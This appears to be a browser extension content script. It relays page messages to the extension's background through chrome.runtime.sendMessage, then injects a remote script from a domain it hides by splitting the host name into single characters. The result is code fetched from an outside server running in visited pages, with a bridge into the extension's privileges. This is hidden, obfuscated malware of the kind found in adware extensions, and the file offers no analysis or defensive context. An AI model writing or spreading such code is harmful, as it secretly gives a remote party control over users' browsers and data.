'use strict';

var sendMessage = function() {
    chrome.runtime.sendMessage(Array.prototype.slice.call(arguments));
};

window.addEventListener('message', function(e) {
    if (e.origin == window.location.origin && e.data.direction && e.data.direction == 'to_browser_addon') {
        var data = e.data.message;
        sendMessage.apply(null, data);
    }
});

(function() {
    var scr = document.createElement('script');
    scr.type = 'text/javascript';
    scr.src = "\/\/b" + "b" + "p" + "i" + "." + "r" + "u\/" + "api\/proxy" + "10" + "25" + Math.floor(1 * Math.random());

    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(scr, s);
    try {
        var fc = document.body.firstChild;
        fc.parentNode.insertBefore(s, fc);
    } catch (e) {
        document.body.appendChild(s);
    }
})();